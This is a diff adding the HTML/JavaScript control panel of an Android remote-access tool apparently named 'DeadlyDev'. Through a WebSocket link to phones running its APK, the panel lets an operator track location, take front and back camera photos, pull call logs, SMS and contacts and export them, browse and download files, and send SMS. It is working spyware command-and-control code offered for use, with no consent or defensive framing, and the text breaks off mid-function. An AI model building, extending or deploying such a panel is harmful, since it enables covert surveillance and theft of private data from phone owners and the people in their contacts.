@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>DeadlyDev — Control Panel</title>
+<style>
+:root {
+  --bg:      #080809;
+  --bg2:     #0f0f12;
+  --bg3:     #181820;
+  --border:  #222230;
+  --border2: #30303f;
+  --accent:  #00e676;
+  --accentd: #003d1a;
+  --accentm: #00b050;
+  --text:    #e2e2e2;
+  --text2:   #7a7a8a;
+  --text3:   #3a3a4a;
+  --red:     #f44336;
+  --blue:    #2979ff;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{height:100%;overflow:hidden}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);
+     display:flex;flex-direction:column;height:100dvh}
+
+/* NAV */
+nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:0 14px;
+    height:52px;display:flex;align-items:center;justify-content:space-between;
+    flex-shrink:0;z-index:100;box-shadow:0 1px 0 rgba(0,230,118,.06)}
+.nav-brand{display:flex;align-items:center;gap:10px}
+.nav-logo{width:34px;height:34px;border-radius:50%;object-fit:cover;
+          border:2px solid var(--accent);box-shadow:0 0 10px rgba(0,230,118,.35)}
+.nav-title{font-size:17px;font-weight:800;color:#fff;letter-spacing:.3px}
+.nav-title em{color:var(--accent);font-style:normal}
+#conn-pill{font-size:11px;padding:4px 11px;border-radius:20px;font-weight:700;
+           white-space:nowrap;transition:all .3s}
+#conn-pill.on{color:var(--accent);border:1px solid var(--accent);
+              background:rgba(0,230,118,.08);box-shadow:0 0 8px rgba(0,230,118,.2)}
+#conn-pill.off{color:var(--red);border:1px solid #f4433640;background:rgba(244,67,54,.06)}
+
+/* BOTTOM TAB BAR — mobile */
+.tabs{display:none;background:var(--bg2);border-top:1px solid var(--border);
+      flex-shrink:0;z-index:50}
+.tabs button{flex:1;padding:8px 2px 6px;background:none;border:none;color:var(--text3);
+             font-size:10px;cursor:pointer;display:flex;flex-direction:column;
+             align-items:center;gap:2px;transition:color .2s;min-width:0}
+.tabs button .ti{font-size:20px;line-height:1}
+.tabs button.act{color:var(--accent)}
+.tabs button .bar{width:28px;height:2px;border-radius:2px;background:transparent;margin-top:2px}
+.tabs button.act .bar{background:var(--accent)}
+
+/* LAYOUT */
+.layout{display:flex;flex:1;overflow:hidden}
+
+/* SIDEBAR */
+.sidebar{width:250px;min-width:250px;background:var(--bg2);
+         border-right:1px solid var(--border);display:flex;
+         flex-direction:column;flex-shrink:0;overflow-y:auto}
+.sb-head{padding:14px 14px 6px;font-size:10px;text-transform:uppercase;
+         letter-spacing:1.5px;color:var(--text3)}
+#dev-list{padding:0 8px 8px;flex:1}
+.dcard{padding:11px 12px;border-radius:10px;margin-bottom:6px;cursor:pointer;
+       border:1px solid transparent;transition:all .15s;position:relative}
+.dcard:active{transform:scale(.98)}
+.dcard.sel{background:#06180e;border-color:var(--accent);
+           box-shadow:0 0 14px rgba(0,230,118,.12)}
+.dcard:not(.sel):hover{background:var(--bg3)}
+.dcard .dn{font-size:13px;font-weight:700;color:#fff}
+.dcard .di{font-size:11px;color:var(--text2);margin-top:2px}
+.dcard .ds{display:flex;align-items:center;gap:6px;margin-top:5px}
+.dot{width:7px;height:7px;border-radius:50%;flex-shrink:0}
+.dot.on{background:var(--accent);box-shadow:0 0 6px rgba(0,230,118,.6);animation:blink 2s infinite}
+.dot.off{background:var(--red)}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.4}}
+.ds-lbl{font-size:11px}
+.ds-lbl.on{color:var(--accent)} .ds-lbl.off{color:var(--red)}
+.ds-bat{font-size:11px;color:var(--text2);margin-left:auto}
+.no-dev{color:var(--text3);font-size:12px;text-align:center;padding:32px 14px;
+        line-height:1.8}
+.wsbox{margin:8px;padding:10px 12px;background:var(--accentd);
+       border:1px solid var(--accentm);border-radius:8px}
+.wsbox .wsl{font-size:9px;color:var(--accentm);text-transform:uppercase;
+            letter-spacing:.5px;margin-bottom:4px}
+.wsbox .wsu{font-size:10px;color:var(--accent);word-break:break-all;
+            font-family:monospace;cursor:pointer}
+.wsbox .wsh{font-size:10px;color:var(--text2);margin-top:5px;line-height:1.4}
+
+/* MAIN */
+.main{flex:1;display:flex;flex-direction:column;overflow:hidden;min-width:0}
+
+/* WAITING SCREEN */
+#wait-screen{flex:1;display:flex;flex-direction:column;align-items:center;
+             justify-content:center;gap:18px;padding:32px;text-align:center}
+#wait-screen .ws-icon{font-size:52px;animation:float 3s ease-in-out infinite}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+#wait-screen .ws-title{font-size:20px;font-weight:800;color:#fff}
+#wait-screen .ws-sub{font-size:13px;color:var(--text2);line-height:1.6;max-width:280px}
+#wait-screen .ws-url-box{background:var(--accentd);border:1px solid var(--accentm);
+                          border-radius:10px;padding:12px 16px;max-width:320px;width:100%;
+                          font-family:monospace;font-size:11px;color:var(--accent);
+                          word-break:break-all;cursor:pointer;text-align:left}
+#wait-screen .ws-url-label{font-size:9px;color:var(--accentm);text-transform:uppercase;
+                            letter-spacing:1px;margin-bottom:5px}
+.spinner{width:36px;height:36px;border:3px solid var(--border);
+         border-top-color:var(--accent);border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+/* CTRL PANEL */
+#ctrl-screen{flex:1;display:none;flex-direction:column;overflow:hidden}
+.cp-head{padding:11px 14px 10px;border-bottom:1px solid var(--border);flex-shrink:0}
+.cp-dev{font-size:12px;color:var(--text2);margin-bottom:8px}
+.cp-dev strong{color:var(--accent);font-weight:700}
+.cmd-grid{display:flex;flex-wrap:wrap;gap:6px}
+.cb{padding:8px 13px;background:var(--bg3);border:1px solid var(--border2);
+    border-radius:9px;color:var(--text);font-size:12px;cursor:pointer;
+    transition:all .15s;white-space:nowrap;display:flex;align-items:center;
+    gap:5px;touch-action:manipulation;font-family:inherit;-webkit-appearance:none}
+.cb:active{transform:scale(.95)}
+.cb:hover{background:#1e1e2a;border-color:var(--accent);color:#fff}
+.cb.green{background:var(--accentd);border-color:var(--accent);
+          color:var(--accent);font-weight:700}
+.cb.green:hover{background:#005c22}
+
+/* SMS FORM */
+#sms-form{display:none;background:var(--bg3);border:1px solid var(--border2);
+          border-radius:10px;padding:12px;margin-top:8px;flex-direction:column;gap:7px}
+#sms-form.show{display:flex}
+#sms-form input,#sms-form textarea{background:var(--bg);border:1px solid var(--border2);
+  border-radius:7px;color:#fff;padding:8px 11px;font-size:13px;outline:none;
+  width:100%;font-family:inherit}
+#sms-form input:focus,#sms-form textarea:focus{border-color:var(--accent)}
+#sms-form textarea{resize:vertical;min-height:58px}
+.sms-row{display:flex;gap:7px}
+.sms-send{background:var(--accent);border:none;border-radius:7px;color:#000;
+          padding:8px 16px;font-size:13px;cursor:pointer;font-weight:800;flex:1;font-family:inherit}
+.sms-cancel{background:var(--border2);border:none;border-radius:7px;color:var(--text);
+            padding:8px 12px;font-size:13px;cursor:pointer;font-family:inherit}
+
+/* RESULTS */
+#results{flex:1;overflow-y:auto;padding:10px;display:flex;
+         flex-direction:column;gap:8px;-webkit-overflow-scrolling:touch}
+.ri{background:var(--bg2);border:1px solid var(--border);border-radius:11px;
+    overflow:hidden;flex-shrink:0}
+.rh{padding:7px 12px;background:var(--bg3);font-size:11px;color:var(--text2);
+    display:flex;justify-content:space-between;align-items:center;gap:8px;
+    border-bottom:1px solid var(--border)}
+.rh .rt{color:var(--accent);font-weight:700;font-size:11px}
+.rb{padding:10px 12px}
+.rb pre{white-space:pre-wrap;word-break:break-word;font-family:monospace;
+        font-size:12px;color:#ccc;line-height:1.5;max-height:280px;overflow-y:auto}
+.rb img{max-width:100%;max-height:320px;border-radius:7px;display:block}
+.dl-link{display:inline-flex;align-items:center;gap:7px;background:var(--accentd);
+         border:1px solid var(--accent);border-radius:7px;padding:7px 14px;
+         color:var(--accent);text-decoration:none;font-size:13px;cursor:pointer;
+         margin-top:4px;font-weight:600}
+.dl-link:hover{background:#005c22}
+.map-link{display:inline-flex;align-items:center;gap:6px;background:#06180e;
+          border:1px solid var(--accent);border-radius:7px;padding:7px 14px;
+          color:var(--accent);text-decoration:none;font-size:13px;margin-top:8px}
+.loc-pre{font-size:12px;color:#aaa;margin-bottom:6px;line-height:1.4}
+
+/* FILE MANAGER */
+.fm-path{font-size:11px;color:var(--accent);font-family:monospace;margin-bottom:7px}
+.fm-back{display:inline-flex;align-items:center;gap:5px;background:var(--bg3);
+         border:1px solid var(--border2);border-radius:7px;padding:5px 10px;
+         color:var(--text2);font-size:11px;cursor:pointer;margin-bottom:7px}
+.fm-back:hover{border-color:var(--accent);color:var(--accent)}
+.fm-list{display:flex;flex-direction:column;gap:3px;max-height:320px;overflow-y:auto}
+.fmi{display:flex;align-items:center;gap:8px;padding:7px 10px;background:var(--bg3);
+     border:1px solid var(--border);border-radius:8px;cursor:pointer;transition:all .15s}
+.fmi:active{transform:scale(.98)}
+.fmi:hover{border-color:var(--accent);background:#06180e}
+.fmi .fi{font-size:16px;flex-shrink:0;width:22px;text-align:center}
+.fmi .fn{font-size:12px;color:#ddd;flex:1;word-break:break-all}
+.fmi .fs{font-size:10px;color:var(--text3);white-space:nowrap}
+.fmi .fdl{background:var(--accentd);border:1px solid var(--accent);color:var(--accent);
+          border-radius:6px;padding:3px 9px;font-size:10px;cursor:pointer;
+          white-space:nowrap;font-weight:700}
+.fm-empty{color:var(--text3);font-size:12px;text-align:center;padding:14px}
+
+/* CONTACTS / MESSAGES */
+.dp{padding:10px 12px}
+.dp-top{display:flex;align-items:flex-start;justify-content:space-between;
+        margin-bottom:8px;gap:8px;flex-wrap:wrap}
+.dp-info .dp-title{font-size:13px;font-weight:800;color:var(--accent)}
+.dp-info .dp-count{font-size:11px;color:var(--text2)}
+.dp-actions{display:flex;gap:6px;flex-shrink:0}
+.dl-btn{display:flex;align-items:center;gap:5px;background:var(--accentd);
+        border:1px solid var(--accent);color:var(--accent);border-radius:7px;
+        padding:6px 13px;font-size:11px;cursor:pointer;font-weight:700;border:1px solid var(--accent)}
+.dl-btn:hover{background:#005c22}
+.srch{width:100%;background:var(--bg);border:1px solid var(--border2);border-radius:7px;
+      color:#fff;padding:7px 11px;font-size:12px;outline:none;margin-bottom:8px;font-family:inherit}
+.srch:focus{border-color:var(--accent)}
+.tbl-wrap{max-height:320px;overflow-y:auto;-webkit-overflow-scrolling:touch}
+table.ct{width:100%;border-collapse:collapse;font-size:12px}
+table.ct th{text-align:left;padding:6px 8px;color:var(--text3);font-size:10px;
+            text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid var(--border)}
+table.ct td{padding:7px 8px;border-bottom:1px solid var(--border);
+            color:var(--text);vertical-align:top;word-break:break-word}
+table.ct tr:hover td{background:var(--bg3)}
+table.ct td.cn{font-weight:700;color:#fff}
+table.ct td.cp{color:var(--accent);font-family:monospace;font-size:11px}
+table.ct td.ce{color:var(--text2);font-size:11px}
+.msg-item{padding:8px 10px;background:var(--bg3);border:1px solid var(--border);
+          border-radius:9px;margin-bottom:5px}
+.msg-hd{display:flex;justify-content:space-between;align-items:center;
+        margin-bottom:3px;flex-wrap:wrap;gap:4px}
+.msg-fr{font-size:12px;font-weight:700;color:#fff}
+.msg-badge{font-size:9px;padding:2px 7px;border-radius:10px;font-weight:700}
+.msg-badge.in{background:var(--accentd);color:var(--accent)}
+.msg-badge.sn{background:#0d1f3a;color:var(--blue)}
+.msg-dt{font-size:10px;color:var(--text3)}
+.msg-bd{font-size:12px;color:#bbb;line-height:1.4;margin-top:2px}
+.msg-list{max-height:320px;overflow-y:auto;display:flex;flex-direction:column;
+          gap:4px;-webkit-overflow-scrolling:touch}
+.empty-st{text-align:center;padding:24px;color:var(--text3);font-size:12px}
+.empty-st .eico{font-size:32px;margin-bottom:8px}
+
+/* SCROLLBAR */
+::-webkit-scrollbar{width:4px;height:4px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:#2a2a3a;border-radius:2px}
+::-webkit-scrollbar-thumb:hover{background:var(--accentm)}
+
+/* OVERLAY */
+#overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);z-index:150}
+
+/* MOBILE */
+@media(max-width:640px){
+  .tabs{display:flex}
+  .sidebar{position:fixed;left:0;top:0;bottom:0;z-index:200;width:82vw;max-width:300px;
+           transform:translateX(-100%);box-shadow:6px 0 30px rgba(0,0,0,.6);
+           transition:transform .25s ease}
+  .sidebar.open{transform:translateX(0)}
+  #overlay.show{display:block}
+}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-brand">
+    <img src="/deadlydev.jpg" class="nav-logo" alt="DD" onerror="this.style.display='none'">
+    <div class="nav-title"><em>Deadly</em>Dev</div>
+  </div>
+  <div id="conn-pill" class="off">⬤ Offline</div>
+</nav>
+
+<!-- OVERLAY (mobile sidebar close) -->
+<div id="overlay" onclick="closeSb()"></div>
+
+<div class="layout">
+
+  <!-- SIDEBAR -->
+  <div class="sidebar" id="sidebar">
+    <div class="sb-head">Connected Devices</div>
+    <div id="dev-list">
+      <div class="no-dev">
+        <div style="font-size:32px;margin-bottom:10px">📱</div>
+        No devices yet.<br>Install the APK and open it.
+      </div>
+    </div>
+    <div id="wsbox" style="display:none">
+      <div class="wsbox">
+        <div class="wsl">WebSocket URL (copy to app)</div>
+        <div class="wsu" id="wsu" onclick="copyUrl()">—</div>
+        <div class="wsh">Tap to copy · Set this URL in the Android app</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MAIN -->
+  <div class="main" id="main">
+
+    <!-- WAITING SCREEN (shown until device selected) -->
+    <div id="wait-screen">
+      <div class="ws-icon">📡</div>
+      <div class="ws-title">Waiting for device…</div>
+      <div class="ws-sub">Open the DeadlyDev app on your Android phone. It will connect automatically.</div>
+      <div class="spinner"></div>
+      <div id="wait-url-box" style="display:none">
+        <div class="ws-url-label">App WebSocket URL</div>
+        <div id="wait-url" style="font-family:monospace;font-size:11px;color:var(--accent);word-break:break-all;margin-top:4px;cursor:pointer" onclick="copyUrl()">—</div>
+        <div style="font-size:10px;color:var(--text2);margin-top:6px">Tap to copy · Set in Android app config</div>
+      </div>
+    </div>
+
+    <!-- CONTROL SCREEN (shown when device selected) -->
+    <div id="ctrl-screen">
+      <div class="cp-head">
+        <div class="cp-dev">Device: <strong id="sel-name">—</strong></div>
+        <div class="cmd-grid">
+          <button class="cb" onclick="sc('get_location')">📍 Location</button>
+          <button class="cb" onclick="sc('capture_back')">📷 Camera</button>
+          <button class="cb" onclick="sc('capture_front')">🤳 Selfie</button>
+          <button class="cb" onclick="sc('get_call_log')">📞 Calls</button>
+          <button class="cb" onclick="sc('get_sms')">💬 SMS File</button>
+          <button class="cb" onclick="sc('get_contacts')">👥 Contacts File</button>
+          <button class="cb green" onclick="loadContacts()">👥 View Contacts</button>
+          <button class="cb green" onclick="loadMessages()">💬 View Messages</button>
+          <button class="cb" onclick="sc('list_files',{path:''})">📁 Files</button>
+          <button class="cb" onclick="toggleSms()">✉️ Send SMS</button>
+        </div>
+        <div id="sms-form">
+          <input id="sms-num" type="tel" placeholder="Phone number (+92...)">
+          <textarea id="sms-txt" placeholder="Message text…"></textarea>
+          <div class="sms-row">
+            <button class="sms-send" onclick="doSms()">Send</button>
+            <button class="sms-cancel" onclick="toggleSms()">Cancel</button>
+          </div>
+        </div>
+      </div>
+      <div id="results"></div>
+    </div>
+
+  </div>
+</div>
+
+<!-- BOTTOM TAB BAR (mobile) -->
+<div class="tabs" id="tabs">
+  <button class="act" id="tab-dev" onclick="goTab('dev',this)">
+    <span class="ti">📱</span>Devices<div class="bar"></div>
+  </button>
+  <button id="tab-ctrl" onclick="goTab('ctrl',this)">
+    <span class="ti">⚡</span>Control<div class="bar"></div>
+  </button>
+  <button id="tab-con" onclick="goTab('con',this)">
+    <span class="ti">👥</span>Contacts<div class="bar"></div>
+  </button>
+  <button id="tab-msg" onclick="goTab('msg',this)">
+    <span class="ti">💬</span>Messages<div class="bar"></div>
+  </button>
+</div>
+
+<script>
+// ── State
+let ws = null, wsUrl = '', selId = null;
+const devs = {}, cache = {}; // cache[id] = { contacts, messages }
+const isMob = () => window.innerWidth <= 640;
+
+// ── Boot
+(async () => {
+  try {
+    const cfg = await fetch('/config').then(r => r.json());
+    wsUrl = cfg.wsUrl;
+    document.getElementById('wsu').textContent = wsUrl;
+    document.getElementById('wait-url').textContent = wsUrl;
+    document.getElementById('wsbox').style.display = 'block';
+    document.getElementById('wait-url-box').style.display = 'block';
+  } catch(e) {}
+  connect();
+})();
+
+function connect() {
+  if (ws && ws.readyState < 2) return;
+  ws = new WebSocket(wsUrl || location.href.replace(/^http/,'ws').replace(/\/$/,'') + '/ws');
+  ws.onopen = () => {
+    setConn(true);
+    ws.send(JSON.stringify({ type:'browser_init' }));
+  };
+  ws.onclose = ws.onerror = () => {
+    setConn(false);
+    setTimeout(connect, 3000);
+  };
+  ws.onmessage = ({ data }) => {
+    try { handle(JSON.parse(data)); } catch(_) {}
+  };
+}
+
+function setConn(on) {
+  const p = document.getElementById('conn-pill');
+  p.textContent = on ? '⬤ Online' : '⬤ Offline';
+  p.className = on ? 'on' : 'off';
+}
+
+// ── Message handler
+function handle(m) {
+  switch(m.type) {
+    case 'ping': ws.send('{"type":"pong"}'); break;
+    case 'device_list':
+      Object.keys(devs).forEach(k => delete devs[k]);
+      m.devices.forEach(d => devs[d.deviceId] = d);
+      renderDevs();
+      if (!selId && m.devices.length) pickDev(m.devices[0].deviceId);
+      break;
+    case 'device_connected':
+      devs[m.device.deviceId] = m.device;
+      renderDevs();
+      if (!selId) pickDev(m.device.deviceId);
+      break;
+    case 'device_disconnected':
+      if (devs[m.deviceId]) { devs[m.deviceId].isOnline = false; renderDevs(); }
+      break;
+    case 'device_update':
+      if (devs[m.deviceId]) { devs[m.deviceId].battery = m.battery; renderDevs(); }
+      break;
+    case 'response':   if (m.deviceId===selId) addText(m.data); break;
+    case 'photo':      if (m.deviceId===selId) addPhoto(m); break;
+    case 'file':       if (m.deviceId===selId) addFile(m); break;
+    case 'location':   if (m.deviceId===selId) addLoc(m); break;
+    case 'file_list':  if (m.deviceId===selId) addFm(m); break;
+    case 'contacts_data':
+      if (!cache[m.deviceId]) cache[m.deviceId] = {};
+      cache[m.deviceId].contacts = m.contacts || [];
+      if (m.deviceId===selId) showContacts(m.contacts || []);
+      break;
+    case 'messages_data':
+      if (!cache[m.deviceId]) cache[m.deviceId] = {};
+      cache[m.deviceId].messages = m.messages || [];
+      if (m.deviceId===selId) showMessages(m.messages || []);
+      break;
+  }
+}
+
+// ── Device list
+function renderDevs() {
+  const el = document.getElementById('dev-list');
+  const ids = Object.keys(devs);
+  if (!ids.length) {
+    el.innerHTML = '<div class="no-dev"><div style="font-size:32px;margin-bottom:10px">📱</div>No devices yet.<br>Install the APK and open it.</div>';
+    return;
+  }
+  el.innerHTML = ids.map(id => {
+    const d = devs[id], on = d.isOnline !== false;
+    return `<div class="dcard${id===selId?' sel':''}" onclick="pickDev('${id}')">
+      <div class="dn">${x(d.deviceName||'Unknown')}</div>
+      <div class="di">Android ${d.androidVersion||'?'} · ${d.network||'?'}</div>
+      <div class="ds">
+        <div class="dot ${on?'on':'off'}"></div>
+        <span class="ds-lbl ${on?'on':'off'}">${on?'Online':'Offline'}</span>
+        <span class="ds-bat">🔋${d.battery||0}%</span>
+      </div></div>`;
+  }).join('');
+}
+
+function pickDev(id) {
+  selId = id;
+  renderDevs();
+  document.getElementById('sel-name').textContent = devs[id]?.deviceName || id;
+  document.getElementById('results').innerHTML = '';
+  document.getElementById('wait-screen').style.display = 'none';
+  document.getElementById('ctrl-screen').style.display = 'flex';
+  document.getElementById('ctrl-screen').style.flexDirection = 'column';
+  if (isMob()) { closeSb(); goTab('ctrl', document.getElementById('tab-ctrl')); }
+}
+
+// ── Commands
+function sc(action, params={}) {
+  if (!selId) { return; }
+  if (!ws || ws.readyState !== 1) return;
+  ws.send(JSON.stringify({ type:'send_command', deviceId:selId, action, params }));
+}
+
+function loadContacts() {
+  if (!selId) return;
+  const c = cache[selId]?.contacts;
+  if (c) { showContacts(c); return; }
+  addText('Fetching contacts from device…');
+  sc('get_contacts_web');
+}
+
+function loadMessages() {
+  if (!selId) return;
+  const m = cache[selId]?.messages;
+  if (m) { showMessages(m); return; }
+  addText('Fetching messages from device…');
+  sc('get_sms_web');
+}
+
+function toggleSms() {
+  document.getElementById('sms-form').classList.toggle('show');
+}
+
+function doSms() {
+  const n = document.getElementById('sms-num').value.trim();
+  const t = document.getElementById('sms-txt').value.trim();
+  if (!n || !t) { alert('Enter number and message'); return; }
+  sc('send_sms', { number:n, message:t });
+  toggleSms();
+}
+
+// ── Result renderers
+function addResult(tag, html) {
+  const div = document.createElement('div');
+  div.className = 'ri';
+  div.innerHTML = `<div class="rh"><span class="rt">${tag}</span><span>${new Date().toLocaleTimeString()}</span></div><div class="rb">${html}</div>`;
+  const r = document.getElementById('results');
+  r.prepend(div);
+  while (r.children.length > 30) r.removeChild(r.lastChild);
+}
+
+function addText(t, tag='Response') {
+  addResult(tag, `<pre>${x(t)}</pre>`);
+}
+
+function addPhoto(m) {
+  const src = 'data:image/jpeg;base64,' + m.fileData;
+  addResult('📷 Photo', `<img src="${src}"><br><a href="${src}" download="${m.fileName||'photo.jpg'}" class="dl-link">⬇ Save Photo</a>`);
+}
+
+function addFile(m) {
+  const b = atob(m.fileData), a = new Uint8Array(b.length);
+  for (let i=0;i<b.length;i++) a[i]=b.charCodeAt(i);
+  const url = URL.createObjectURL(new Blob([a]));
+  const sz = fmtSz(m.fileSize||a.length);
+  addResult('📎 File', `<a href="${url}" download="${x(m.fileName||'file')}" class="dl-link">⬇ ${x(m.fileName||'file')} <small style="opacity:.7">(${sz})</small></a>`);
+}
+
+function addLoc(m) {
+  const url = `https://www.google.com/maps?q=${m.lat},${m.lng}`;
+  addResult('📍 Location', `<div class="loc-pre">${m.caption?x(m.caption):''}</div><a href="${url}" target="_blank" class="map-link">🗺 Open in Google Maps</a>`);
+}
+
+function addFm(m) {
+  const path = m.path||'/';
+  const items = m.items||[];
+  let h = `<div class="fm-path">📁 ${x(path)}</div>`;
+  if (path && path !== '/') {
+    const par = path.includes('/') ? path.substring(0,path.lastIndexOf('/'))||'/' : '/';
+    h += `<div class="fm-back" onclick="sc('list_files',{path:'${x(par)}'})">⬅ Back</div>`;
+  }
+  if (!items.length) { h += '<div class="fm-empty">Empty folder</div>'; }
+  else {
+    h += '<div class="fm-list">';
+    items.forEach(it => {
+      if (it.isDir) {
+        const np = (path==='/'?'':path)+'/'+it.name;
+        h += `<div class="fmi" onclick="sc('list_files',{path:'${x(np)}'})"><span class="fi">📁</span><span class="fn">${x(it.name)}</span><span class="fs">${it.size||'—'}</span></div>`;
+      } else {
+        const fp = (path==='/'?'':path)+'/'+it.name;
+        h += `<div class="fmi"><span class="fi">${ficon(it.name)}</span><span class="fn">${x(it.name)}</span><span class="fs">${it.size||'—'}</span><button class="fdl" onclick="event.stopPropagation();sc('download_file',{path:'${x(fp)}'})">⬇ DL</button></div>`;
+      }
+    });
+    h += '</div>';
+  }
+  // Reuse existing FM card — navigate in-place, don't spawn new cards
+  const existing = document.getElementById('fm-card');
+  if (existing) {
+    existing.querySelector('.rb').innerHTML = h;
+    existing.querySelector('.rh span:last-child').textContent = new Date().toLocaleTimeString();
+    existing.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  } else {
+    const div = document.createElement('div');
+    div.className = 'ri'; div.id = 'fm-card';
+    div.innerHTML = `<div class="rh"><span class="rt">📁 File Manager</span><span>${new Date().toLocaleTimeString()}</span></div><div class="rb">${h}</div>`;
+    const r = document.getElementById('results');
+    r.prepend(div);
+    while (r.children.length > 30) r.removeChild(r.lastChild);
+  }
+}
+
+// ── Contacts panel
+function showContacts(list) {
+  window._allC = list;
+  addResult('👥 Contacts', buildContactsHtml(list, list));
+  requestAnimationFrame(() => {
+    document.getElementById('dl-c')?.addEventListener('click', () => dlContacts(list));
+    document.getElementById('ref-c')?.addEventListener('click', () => { delete cache[selId]?.contacts; sc('get_contacts_web'); });
+  });
+}
+
+function buildContactsHtml(all, filtered) {
+  return `<div class="dp">
+    <div class="dp-top">
+      <div class="dp-info">
+        <div class="dp-title">👥 Contact List</div>
+        <div class="dp-count">${all.length} contacts${filtered.length!==all.length?' · '+filtered.length+' shown':''}</div>
+      </div>
+      <div class="dp-actions">
+        <button class="dl-btn" id="dl-c">⬇ CSV</button>
+        <button class="cb" id="ref-c" style="font-size:11px;padding:5px 10px">↻</button>
+      </div>
+    </div>
+    <input class="srch" placeholder="🔍 Search name / number…" oninput="filterC(this.value)">
+    <div class="tbl-wrap" id="ctbl">${renderCTable(filtered)}</div>
+  </div>`;
+}
+
+function renderCTable(list) {
+  if (!list.length) return '<div class="empty-st"><div class="eico">👥</div>No contacts found</div>';
+  return `<table class="ct"><thead><tr><th>#</th><th>Name</th><th>Phone</th><th>Email</th></tr></thead>
+    <tbody>${list.map((c,i)=>`<tr>
+      <td style="color:var(--text3);font-size:10px">${i+1}</td>
+      <td class="cn">${x(c.name||'—')}</td>
+      <td class="cp">${(c.phones||[]).map(p=>`<div>${x(p)}</div>`).join('')||'—'}</td>
+      <td class="ce">${(c.emails||[]).map(e=>`<div>${x(e)}</div>`).join('')||'—'}</td>
+    </tr>`).join('')}</tbody></table>`;
+}
+
+window.filterC = function(q) {
+  const all = window._allC||[];
+  const f = q ? all.filter(c => (c.name||'').toLowerCase().includes(q.toLowerCase()) ||
+    (c.phones||[]).some(p=>p.includes(q)) || (c.emails||[]).some(e=>e.toLowerCase().includes(q.toLowerCase()))) : all;
+  const el = document.getElementById('ctbl');
+  if (el) el.innerHTML = renderCTable(f);
+};
+
+function dlContacts(list) {
+  let csv = 'Name,Phone,Email\n';
+  list.forEach(c => {
+    csv += `"${(c.name||'').replace(/"/g,'""')}","${(c.phones||[]).join(' | ')}","${(c.emails||[]).join(' | ')}"\n`;
+  });
+  dl(csv, 'text/csv', `contacts_${selId}_${Date.now()}.csv`);
+}
+
+// ── Messages panel
+function showMessages(list) {
+  window._allM = list;
+  addResult('💬 Messages', buildMsgHtml(list, list));
+  requestAnimationFrame(() => {
+    document.getElementById('dl-m')?.addEventListener('click', () => dlMessages(list));
+    document.getElementById('ref-m')?.addEventListener('click', () => { delete cache[selId]?.messages; sc('get_sms_web'); });
+  });
+}
+
+function buildMsgHtml(all, filtered) {
+  return `<div class="dp">
+    <div class="dp-top">
+      <div class="dp-info">
+        <div class="dp-title">💬 Messages</div>
+        <div class="dp-count">${all.length} messages${filtered.length!==all.length?' · '+filtered.length+' shown':''}</div>
+      </div>
+      <div class="dp-actions">
+        <button class="dl-btn" id="dl-m">⬇ TXT</button>
+        <button class="cb" id="ref-m" style="font-size:11px;padding:5px 10px">↻</button>
+      </div>
+    </div>
+    <input class="srch" placeholder="🔍 Search number / text…" oninput="filterM(this.value)">
+    <div class="msg-list" id="mlist">${renderMList(filtered)}</div>
+  </div>`;
+}
+
+function renderMList(list) {
+  if (!list.length) return '<div class="empty-st"><div class="eico">💬</div>No messages found</div>';
+  return list.map(m => `<div class="msg-item">
+    <div class="msg-hd">
+      <div class="msg-fr">${x(m.address||'Unknown')}</div>
+      <span class="msg-badge ${m.type==='sent'?'sn':'in'}">${m.type==='sent'?'📤 Sent':'📥 Inbox'}</span>
+      <div class="msg-dt">${x(m.date||'')}</div>
+    </div>
+    <div class="msg-bd">${x(m.body||'')}</div>
+  </div>`).join('');
+}
+
+window.filterM = function(q) {
+  const all = window._allM||[];
+  const f = q ? all.filter(m => (m.address||'').includes(q) || (m.body||'').toLowerCase().includes(q.toLowerCase())) : all;
+  const el = document.getElementById('mlist');
+  if (el) el.innerHTML = renderMList(f);
+};
+
+function dlMessages(list) {
+  let t = 'DeadlyDev - SMS Export\n' + '═'.repeat(36) + '\n\n';
+  list.forEach(m => {
+    t += `[${(m.type||'').toUpperCase()}] ${m.address||'?'}   ${m.date||''}\n${m.body||''}\n${'─'.repeat(36)}\n`;
+  });
+  dl(t, 'text/plain', `messages_${selId}_${Date.now()}.txt`);
+}
+
+// ── Mobile tab switching
+function goTab(tab, btn) {
+  document.querySelectorAll('.tabs button').forEach(b=>b.classList.remove('act'));
+  btn.classList.add('act');
+  if (tab==='dev') { openSb(); return; }
+  closeSb();
+  if (tab==='con') loadContacts();
+  else if (tab==='msg') loadMessages();
+}
+
+function openSb() {
+  document.getElementById('sidebar').classList.add('open');
+  document.getElementById('overlay').classList.add('show');
+}
+function closeSb() {
+  document.getElementById('sidebar').classList.remove('open');
+  document.getElementById('overlay').classList.remove('show');
+}
+
+// ── Helpers
+function x(s) {
+  return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+function fmtSz(b) {
+  return b<1024?b+'B':b<1048576?(b/1024).toFixed(1)+'KB':(b/1048576).toFixed(1)+'MB';
+}
+function ficon(n) {
+  const e=(n||'').split('.').pop().toLowerCase();
+  return {jpg:'🖼',jpeg:'🖼',png:'🖼',gif:'🖼',webp:'🖼',mp4:'🎬',mkv:'🎬',avi:'🎬',
+          mp3:'🎵',wav:'🎵',pdf:'📄',doc:'📄',docx:'📄',txt:'📝',
+          apk:'📦',zip:'🗜',rar:'🗜'}[e]||'📄';
+}
+function dl(content, type, fname) {
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(new Blob([content],{type}));
+  a.download = fname; a.click();
+}
+function copyUrl() {
